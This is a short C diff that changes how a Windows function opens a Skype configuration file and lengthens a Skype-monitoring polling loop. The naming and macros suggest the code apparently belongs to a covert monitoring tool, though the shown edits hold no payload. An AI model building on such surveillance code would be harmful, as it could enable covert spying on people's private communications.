@@ -2123,7 +2123,7 @@ BOOL IsOldSkypeVersion(WCHAR *config_path)
 	char *local_config_map, *ptr = NULL;
 
 	// Fa una copia del file in memoria
-	if ((hFile = FNC(CreateFileW)(config_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
+	if ((hFile = FNC(CreateFileW)(config_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
 		return FALSE;
 	
 	config_size = GetFileSize(hFile, NULL);
@@ -2131,7 +2131,7 @@ BOOL IsOldSkypeVersion(WCHAR *config_path)
 		CloseHandle(hFile);
 		return FALSE;
 	}
-	
+
 	local_config_map = (char *)calloc(config_size + 1, sizeof(char));
 	if (local_config_map == NULL) {
 		CloseHandle(hFile);
@@ -2161,7 +2161,7 @@ BOOL IsOldSkypeVersion(WCHAR *config_path)
 		CloseHandle(hFile);
 		return TRUE;
 	}
-	
+
 	SAFE_FREE(local_config_map);
 	CloseHandle(hFile);
 	return FALSE;
@@ -2340,7 +2340,7 @@ DWORD WINAPI MonitorSkypePM(BOOL *semaphore)
 	WCHAR skype_pm_path[MAX_PATH];
 
 	LOOP {
-		for (DWORD i=0; i<7; i++) {
+		for (DWORD i=0; i<9; i++) {
 			CANCELLATION_POINT((*semaphore));
 			Sleep(250);
 		}
